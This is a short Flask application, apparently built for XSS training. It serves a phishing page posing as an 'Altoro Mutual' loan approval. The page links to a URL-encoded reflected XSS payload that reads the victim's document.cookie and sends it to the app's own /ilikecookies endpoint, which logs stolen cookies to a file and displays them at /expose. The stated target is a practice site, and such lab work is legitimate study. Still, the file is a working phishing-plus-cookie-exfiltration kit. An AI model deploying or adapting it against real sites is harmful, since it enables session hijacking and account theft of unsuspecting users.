import os
import sys
from flask import Flask, request
from time import gmtime, strftime

app=Flask(__name__)

@app.route('/')
def hello():
    return 'I created this site for testing XSS exercises'


@app.route('/heartbeat')
def heartbeat():
    return "I am alive"

@app.route('/expose')
def dumpdata():
    datafile = "/tmp/cookiedata.txt"
    if not os.path.isfile( datafile ):
        return "server contains no data :-("
    with open(datafile) as f:
        lines = f.readlines()
    data = '<html><BODY>'
    for line in lines:
        data = data + line + '</br>'
    data = data + '</BODY></html>'
    return data


@app.route('/ilikecookies')
def recorddata():
    data = request.query_string.decode('unicode-escape') + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
    file = open("/tmp/cookiedata.txt","a")
    file.write(data)
    file.close()
    return data


@app.route('/whoami')
def whoami():
    return request.url_root


@app.route('/loanapproval')
def freejuice():
    crosssite='''<!DOCTYPE html>
 <html> 
     <head> 
         <style> body { background-color:whitesmoke; } </style> 
         <title>Altoro Mutual</title> 
    </head> 
        <body> 
      
        <center> 
            <img src="/images/logo.gif" width="283" height="80/">
            <h1>You are granted loan by Altoro mutual</h1> 
            <p> 
                Your account has been granted an pre approved loan.
                Please to continue further.<a href="%22http%3A%2F%2Fdemo.testfire.net%2Fsearch.jsp%3Fquery%3D%3D%3Cscript%3Evar%20xsession%3D%22%27%27%27%20%20%20request.url_root%20%20%20%27%27%27ilikecookies%3F%22.concat(document.cookie)%3B%20var%20xhttp%20%3D%20new%20XMLHttpRequest()%3B%20xhttp.open(%22GET%22%2C%20xsession%2C%20true)%3B%20xhttp.send()%3C%2Fscript%3E%22">click here</a>
            </p> 
        </center> 
    </body> 
</html>
'''
    return crosssite


if __name__=="__main__":
    app.run()





